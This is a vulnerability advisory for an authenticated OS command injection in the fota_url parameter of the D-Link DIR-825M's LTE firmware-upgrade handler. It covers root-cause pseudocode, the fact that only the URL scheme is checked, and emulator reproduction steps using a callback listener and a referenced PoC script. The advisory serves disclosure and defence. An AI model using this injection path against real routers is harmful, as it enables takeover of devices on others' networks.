# DLINK-DIR-825M-V008: Authenticated command injection in LTE FOTA URL

**Product:** D-Link DIR-825M Hardware A1
**Firmware:** 1.1.8.6 (current firmware listed by D-Link Latin America)
**CWE:** CWE-78
**CVSS:** 7.2 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)
**Authentication:** Administrator authentication is required.
**Affected entry:** POST /boafrm/formLtefotaUpgradeQuectel, parameter fota_url

An authenticated administrator can inject shell metacharacters and execute arbitrary operating-system commands with the Web service's privileges.

The handler accepts fota_url after checking only that it contains an allowed URL scheme, interpolates it into an upgrade_quectel shell command, and passes the result to system().

## Shared emulation

Use the shared model environment: [dir-825m emulator](../../../emu/dir-825m/README.md).
Start it exactly as described there, then return to this case directory.

## Reproduction

1. Start the shared emulator and wait for its documented readiness check.
2. In a second terminal on the host, start this callback listener:

```sh
python3 -m http.server 8000 --bind 192.168.224.2
```

3. From this case directory, run:

```sh
python3 poc.py --target http://192.168.224.1 --username admin --password admin --callback 192.168.224.2:8000
```

Observe the callback or crash indicator described in the shared emulator README. The included `validation.log` records the internal self-test evidence.

## Root cause and attack path

The attack starts at authenticated `POST /boafrm/formLtefotaUpgradeQuectel` with `fota_url`. The handler checks only whether the value contains an accepted URL scheme, then interpolates it into `upgrade_quectel %s&` (or `/var/upgrade_quectel %s&`) and calls `system()`.

Checking for `http://`, `https://`, or `ftp://` is not equivalent to shell escaping. Once the value is concatenated into a command line, shell syntax after the apparent URL can add another command. The PoC preserves the required URL prefix and adds a callback command, demonstrating execution by the Web service.

The relevant pseudocode is embedded below. It shows the request value being read, transformed or copied, and reaching the vulnerable sink.

```c
/* IDA pseudocode excerpt from DIR-825M firmware 1.1.8.6. */
 17341: //----- (00417DA4) --------------------------------------------------------
 17342: int   sub_417DA4(unsigned int *a1)
 17343: {
 17344:   int v2; // $v0
 17345:   unsigned char *v3; // $s2
 17346:   int v4; // $s0
 17347:   unsigned char v6[512]; // [sp+18h] [-200h] BYREF
 17348: 
 17349:   memset(v6, 0, sizeof(v6));
 17350:   v3 = (unsigned char *)sub_41351C(a1, (int)"submit-url", (int)"");
 17351:   v2 = sub_41351C(a1, (int)"fota_url", (int)"");
 17352:   v4 = v2;
 17353:   if ( v2 && (strstr(v2, "http://") || strstr(v4, "https://") || strstr(v4, "ftp://")) )
 17354:   {
 17355:     if ( access("/var/upgrade_quectel", 0) )
 17356:       sprintf(v6, "upgrade_quectel %s&", v4);
 17357:     else
 17358:       sprintf(v6, "/var/upgrade_quectel %s&", v4);
 17359:     system(v6);
 17360:     sleep(2);
 17361:   }
 17362:   return sub_40BB2C(a1, v3);
 17363: }
```

## Suggested remediation

Validate and constrain the affected input before invoking the privileged operation.

